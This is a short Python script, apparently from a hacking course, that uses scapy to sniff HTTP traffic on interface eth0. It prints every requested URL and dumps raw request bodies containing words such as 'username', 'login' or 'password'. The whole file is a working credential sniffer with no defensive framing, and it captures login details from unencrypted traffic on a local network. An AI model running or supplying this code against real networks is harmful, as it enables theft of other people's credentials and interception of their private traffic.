#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = "{}{}".format(packet[http.HTTPRequest].Host, packet[http.HTTPRequest].Path)
        print(url)

        if packet.haslayer(scapy.Raw):
            # print(packet)
            load = packet[scapy.Raw].load
            keywords = [
                'username', 'login', 'uname',
                'user', 'password', 'pass',
            ]

            for keyword in keywords:
                if keyword in load:
                    print("-"*60)
                    print(load)
                    print("-"*60)
                    break


sniff("eth0")